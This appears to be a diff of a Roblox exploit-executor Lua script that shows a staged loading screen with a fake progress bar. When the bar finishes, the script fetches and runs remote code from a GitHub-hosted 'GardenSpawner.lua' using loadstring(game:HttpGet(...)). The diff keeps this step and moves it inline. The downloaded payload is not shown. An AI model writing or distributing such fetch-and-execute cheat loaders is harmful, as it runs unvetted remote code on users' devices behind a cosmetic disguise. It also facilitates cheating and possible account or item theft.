@@ -16,12 +16,11 @@ screenGui.Name = "FullBlueLoadingScreen"
 screenGui.IgnoreGuiInset = true
 screenGui.ResetOnSpawn = false
 
--- Background hitam biru + teks/loading bar (sudah diperbaiki & elegan)
+-- Loading UI
 do
     local bg = Instance.new("Frame", screenGui)
     bg.Size = UDim2.new(0.4, 0, 0.3, 0)
-    bg.AnchorPoint = Vector2.new(0.5, 0.5)
-    bg.Position = UDim2.new(0.5, 0, 0.5, 0)
+    bg.Position = UDim2.new(0.3, 0, 0.35, 0) -- Delta tidak dukung AnchorPoint
     bg.BackgroundColor3 = Color3.fromRGB(10, 10, 30)
     bg.BorderSizePixel = 2
     bg.BorderColor3 = Color3.fromRGB(255, 255, 255)
@@ -79,17 +78,16 @@ do
         "Finalizing..."
     }
 
-    task.spawn(function()
+    coroutine.wrap(function()
         local i = 1
         while screenGui and screenGui.Parent do
             statusText.Text = statuses[i]
             i = (i % #statuses) + 1
             wait(1.5)
         end
-    end)
+    end)()
 
-    -- PROGRESS BAR 1%-100%
-    task.spawn(function()
+    coroutine.wrap(function()
         for i = 1, 100 do
             progressBar.Size = UDim2.new(i / 100, 0, 1, 0)
             percentText.Text = tostring(i) .. "%"
@@ -97,12 +95,9 @@ do
         end
         wait(0.5)
         screenGui:Destroy()
-        loadMainScript()
-    end)
-end
 
--- Fungsi utama setelah loading selesai
-function loadMainScript()
-    local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/DeltaGay/femboy/refs/heads/main/GardenSpawner.lua"))()
-    Spawner.Load()
+        -- Langsung load Spawner (TANPA fungsi tambahan)
+        local Spawner = loadstring(game:HttpGet("https://raw.githubusercontent.com/DeltaGay/femboy/refs/heads/main/GardenSpawner.lua"))()
+        Spawner.Load()
+    end)()
 end
